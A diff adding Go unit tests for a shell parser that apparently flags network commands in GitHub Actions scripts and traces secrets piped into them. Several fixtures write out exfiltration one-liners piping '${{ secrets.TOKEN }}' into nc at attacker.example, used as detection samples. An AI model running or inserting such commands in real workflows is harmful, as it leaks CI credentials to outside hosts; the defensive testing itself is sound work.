@@ -638,6 +638,121 @@ func TestShellParser_FindNetworkCommands(t *testing.T) {
 	}
 }
 
+func TestShellParser_FindNetworkCommandsPipeInputs(t *testing.T) {
+	t.Parallel()
+
+	tests := []struct {
+		name           string
+		script         string
+		wantInPipe     bool
+		wantPipeInputs int
+		wantGHAExpr    string
+	}{
+		{
+			name:           "pipe",
+			script:         `printf "%s" '${{ secrets.TOKEN }}' | nc attacker.example 443`,
+			wantInPipe:     true,
+			wantPipeInputs: 2,
+			wantGHAExpr:    "secrets.TOKEN",
+		},
+		{
+			name:           "pipe all",
+			script:         `printf "%s" '${{ secrets.TOKEN }}' |& nc attacker.example 443`,
+			wantInPipe:     true,
+			wantPipeInputs: 2,
+			wantGHAExpr:    "secrets.TOKEN",
+		},
+		{
+			name:           "block producer",
+			script:         `{ printf "%s" '${{ secrets.TOKEN }}'; } | nc attacker.example 443`,
+			wantInPipe:     true,
+			wantPipeInputs: 2,
+			wantGHAExpr:    "secrets.TOKEN",
+		},
+		{
+			name:           "nested pipeline producer",
+			script:         `printf "%s" '${{ secrets.TOKEN }}' | tee out | nc attacker.example 443`,
+			wantInPipe:     true,
+			wantPipeInputs: 3,
+			wantGHAExpr:    "secrets.TOKEN",
+		},
+		{
+			name:           "standalone command",
+			script:         `nc attacker.example 443`,
+			wantInPipe:     false,
+			wantPipeInputs: 0,
+		},
+	}
+
+	for _, tt := range tests {
+		t.Run(tt.name, func(t *testing.T) {
+			t.Parallel()
+
+			parser := NewShellParser(tt.script)
+			calls := parser.FindNetworkCommands()
+
+			if len(calls) != 1 {
+				t.Fatalf("got %d network commands, want 1", len(calls))
+			}
+			if calls[0].CommandName != "nc" {
+				t.Fatalf("CommandName = %q, want %q", calls[0].CommandName, "nc")
+			}
+			if calls[0].InPipe != tt.wantInPipe {
+				t.Fatalf("InPipe = %v, want %v", calls[0].InPipe, tt.wantInPipe)
+			}
+			if len(calls[0].PipeInputs) != tt.wantPipeInputs {
+				t.Fatalf("len(PipeInputs) = %d, want %d", len(calls[0].PipeInputs), tt.wantPipeInputs)
+			}
+			if tt.wantGHAExpr == "" {
+				return
+			}
+			gotExprs := findGHAExprs(calls[0].PipeInputs)
+			if len(gotExprs) != 1 || gotExprs[0] != tt.wantGHAExpr {
+				t.Fatalf("PipeInputs GHAExprs = %#v, want []string{%q}", gotExprs, tt.wantGHAExpr)
+			}
+		})
+	}
+}
+
+func TestShellParser_FindNetworkCommandsPipeInputsNoLeakage(t *testing.T) {
+	t.Parallel()
+
+	parser := NewShellParser(`printf "%s" '${{ secrets.TOKEN }}' | nc attacker.example 443; nc other.example 443`)
+	calls := parser.FindNetworkCommands()
+
+	if len(calls) != 2 {
+		t.Fatalf("got %d network commands, want 2", len(calls))
+	}
+
+	if calls[0].CommandName != "nc" {
+		t.Fatalf("calls[0].CommandName = %q, want %q", calls[0].CommandName, "nc")
+	}
+	if !calls[0].InPipe {
+		t.Fatalf("calls[0].InPipe = false, want true")
+	}
+	if got := findGHAExprs(calls[0].PipeInputs); len(got) != 1 || got[0] != "secrets.TOKEN" {
+		t.Fatalf("calls[0].PipeInputs GHAExprs = %#v, want []string{%q}", got, "secrets.TOKEN")
+	}
+
+	if calls[1].CommandName != "nc" {
+		t.Fatalf("calls[1].CommandName = %q, want %q", calls[1].CommandName, "nc")
+	}
+	if calls[1].InPipe {
+		t.Fatalf("calls[1].InPipe = true, want false")
+	}
+	if len(calls[1].PipeInputs) != 0 {
+		t.Fatalf("len(calls[1].PipeInputs) = %d, want 0", len(calls[1].PipeInputs))
+	}
+}
+
+func findGHAExprs(args []CommandArg) []string {
+	var exprs []string
+	for _, arg := range args {
+		exprs = append(exprs, arg.GHAExprs...)
+	}
+	return exprs
+}
+
 // TestShellParser_DangerousPatterns tests detection of dangerous shell patterns
 func TestShellParser_DangerousPatterns(t *testing.T) {
 	tests := []struct {
